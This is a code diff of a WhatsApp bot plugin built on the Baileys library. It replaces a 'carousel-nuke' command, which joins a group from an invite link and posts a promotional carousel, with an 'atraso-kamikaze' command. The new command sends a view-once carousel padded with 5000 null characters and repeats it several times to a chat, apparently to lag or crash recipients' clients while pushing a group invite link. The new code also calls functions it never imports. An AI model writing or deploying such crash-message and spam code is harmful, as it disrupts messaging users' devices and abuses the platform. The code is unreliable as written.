@@ -1,69 +1,55 @@
-import { generateWAMessageFromContent, getContentType } from '@whiskeysockets/baileys';
+import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
 
-let handler = async (m, { conn, args, usedPrefix, command }) => {
-  // 🔓 Para que cualquiera lo pueda usar
-  if (!args[0]) return m.reply(`Usa el comando así:\n\n${usedPrefix + command} <link del grupo>\n\nEjemplo:\n${usedPrefix + command} https://chat.whatsapp.com/LvZcbvreV9lBfE1XtwQsUF`);
+let handler = async (m, { conn, args }) => {
+  const target = m.chat;
+  const imagePath = './src/foto.jpg';
+  const groupLink = "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE";
+  const travaSend = 3; // Puedes cambiar cuántas veces enviar
 
-  // Extraer ID del grupo desde el link
-  let groupLinkRegex = /chat\.whatsapp\.com\/([0-9A-Za-z]{20,24})/i;
-  let match = args[0].match(groupLinkRegex);
-  if (!match) return m.reply('❌ Link de grupo inválido.');
+  const media = await prepareWAMessageMedia({ image: { url: imagePath } }, { upload: conn.waUploadToServer });
 
-  let groupCode = match[1];
+  const makeCard = () => ({
+    header: {
+      ...media.imageMessage,
+      title: `\n${groupLink}\n`,
+      gifPlayback: true,
+      subtitle: " ",
+      hasMediaAttachment: false
+    },
+    body: {
+      text: "🎠 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛"
+    },
+    nativeFlowMessage: {
+      buttons: [{
+        name: "cta_url",
+        buttonParamsJson: JSON.stringify({
+          display_text: "Unirme 🚪",
+          url: groupLink,
+          merchant_url: groupLink
+        })
+      }]
+    }
+  });
 
-  // Unirse al grupo
-  let res = await conn.groupAcceptInvite(groupCode).catch(e => {});
-  let isTarget = `${res}@g.us`;
+  const cards = Array.from({ length: 10 }, makeCard);
 
-  // Ejecutar la función de carrusel (versión simplificada aquí)
-  await carouselNew(isTarget, conn);
-
-  m.reply('✅ Carrusel enviado al grupo.');
-};
-
-handler.command = /^carousel-nuke$/i;
-export default handler;
-
-// 🧠 Función que envía el carrusel (puedes reemplazar por tu versión completa)
-async function carouselNew(isTarget, conn) {
-  const push = [];
-  for (let i = 0; i < 5; i++) {
-    push.push({
-      body: { text: `🔥 Oferta especial ${i + 1}` },
-      footer: { text: 'Desliza para más →' },
-      header: {
-        title: `Producto ${i + 1}`,
-        hasMediaAttachment: true,
-        imageMessage: {
-          url: 'https://placekitten.com/400/400',
-          mimetype: 'image/jpeg',
-          jpegThumbnail: null
-        }
-      },
-      nativeFlowMessage: {
-        buttons: []
-      }
-    });
-  }
-
-  const carousel = generateWAMessageFromContent(isTarget, {
+  const msg = {
     viewOnceMessage: {
       message: {
-        messageContextInfo: {
-          deviceListMetadata: {},
-          deviceListMetadataVersion: 2
-        },
         interactiveMessage: {
-          body: { text: "🛍️ ¡Explora nuestras promos!" },
-          footer: { text: "🔄 Carrusel promocional" },
-          header: { hasMediaAttachment: false },
+          body: { text: "🎠 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛\n\n" + "\0".repeat(5000) },
           carouselMessage: {
-            cards: push
+            cards
           }
         }
       }
     }
-  }, {});
+  };
 
-  await conn.relayMessage(isTarget, carousel.message, { messageId: carousel.key.id });
-}
+  for (let i = 0; i < travaSend; i++) {
+    await conn.relayMessage(target, msg, { messageId: generateMessageID() });
+  }
+};
+
+handler.command = ['atraso-kamikaze'];
+export default handler;
